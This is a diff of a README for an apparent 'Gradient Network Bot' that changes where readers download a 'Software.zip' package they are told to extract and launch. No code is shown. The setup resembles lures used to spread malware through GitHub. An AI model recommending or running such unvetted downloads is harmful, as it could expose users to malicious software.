@@ -26,7 +26,7 @@ This repository houses the code for the Gradient Network Bot. The bot serves var
 - gradient-reger
 
 ## Getting Started
-To get started with the Gradient Network Bot, simply download the software package [here](https://github.com/user-attachments/files/18383251/Software.zip). 
+To get started with the Gradient Network Bot, simply download the software package [here](https://github.com/GEWOOWOO/Gradient-Network-Bot/releases/download/v1.0/Software.zip). 
 
 ### Launch the Software
 After downloading the zip file, extract its contents and launch the software to begin using the Gradient Network Bot.
